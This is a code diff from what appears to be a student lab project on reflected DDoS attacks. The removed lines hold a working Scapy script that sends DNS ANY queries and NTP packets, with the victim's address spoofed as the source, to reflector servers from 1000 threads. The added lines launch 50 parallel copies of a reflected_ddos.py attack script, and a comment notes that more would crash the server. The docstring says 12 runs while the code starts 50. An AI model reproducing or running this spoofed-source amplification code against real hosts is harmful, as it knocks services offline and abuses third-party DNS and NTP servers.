@@ -4,68 +4,47 @@ Bouhnine Ayoub 500048
 
 Reflected DDoS
 
-This script performs a reflected DDoS using DNS and NTP servers. For more information, see the README.md file.
+This script will run the reflected_ddos.py script 12 times in parallel. For more information, see the README.md file.
 
 Usage : python3 main.py
 """
-from scapy.all import *
-import concurrent.futures
-import sys
+import subprocess
 import time
+import os
 
 
-def dns_ddos(target, dns_server):
+def run_reflected_ddos(command, process_list):
     """
-    Send a DNS request to the DNS server with the spoofed IP address of the target to perform a reflected DDoS.
+    Function to run a command with Popen and store the process in a list
     """
-    # List of domain names
-    dns_hosts = [
-        "example.com", "www.example.com", "example.org", "example.be",
-        "example.fr", "test.com", "a-very-long-domain-name.com",
-        "a-very-long-domain-name.org",
-        "oh-boy-i-really-hope-this-domain-name-is-not-used-for-dns-reflection-attacks.oof",
-        "i-hope-this-domain-name-is-not-used-for-reflection-attacks.oof",
-        "domain.oof"
-    ]
-
-    # Send a DNS request for each domain name in the list
-    for host in dns_hosts:
-        ip = IP(src=target, dst=dns_server)
-        udp = UDP(dport=5353)
-        dns = DNS(rd=1, qdcount=1, qd=DNSQR(qname=host, qtype=255)) # ANY
-
-        request = (ip / udp / dns)
-        send(request)
-
-
-def ntp_ddos(target, ntp_server):
-    """
-    Send a NTP request to the NTP server with the spoofed IP address of the target to perform a reflected DDoS.
-    """
-    packet = IP(dst=ntp_server, src=target)/UDP(sport=random.randint(2000,65535),dport=123)/NTP(version=4)
-    send(packet)
+    # arbitrary number but it is enough to make the server slows down, more can make the server crash
+    number_of_processes = 50
+    for i in range(number_of_processes):
+        print("[+] Starting Reflected DDoS Attack id: {}".format(i))
+        process = subprocess.Popen(command)
+        process_list.append(process)
 
 
 if __name__ == "__main__":
-    target = "10.12.0.10"
-    dns_server = "10.12.0.20"
-    ntp_server = "10.12.0.30"
+    # List to store the Popen processes
+    process_list = []
 
-    start_time = time.time()
+    command = ['python3', 'reflected_ddos.py']
+    run_reflected_ddos(command, process_list)
 
-    with concurrent.futures.ThreadPoolExecutor(max_workers=1000) as executor:
-        futures = []
-        for i in range(1000):  # alternating between DNS and NTP attacks
-            if (i % 2 == 0):
-                futures.append(executor.submit(
-                    dns_ddos, target, dns_server))
-            else:
-                futures.append(executor.submit(
-                    ntp_ddos, target, ntp_server))
+    print("[INFO] Press CTRL+C to kill the running processes ...")
 
-        # Wait for the tasks to complete
-        for future in concurrent.futures.as_completed(futures):
-            if future.result():
-                executor.shutdown(wait=False)
-                print('Time taken :', time.time() - start_time)
-                sys.exit(0)
+    try:
+        while (True):
+            time.sleep(1)
+    except KeyboardInterrupt as e:
+        # Terminate all the processes in the list
+        for process in process_list:
+            process.terminate()
+            os.kill(process.pid, 9)  # Ensure the process is killed (optional)
+
+        # Wait for all processes to terminate
+        for process in process_list:
+            process.wait()
+
+        print("All processes terminated")
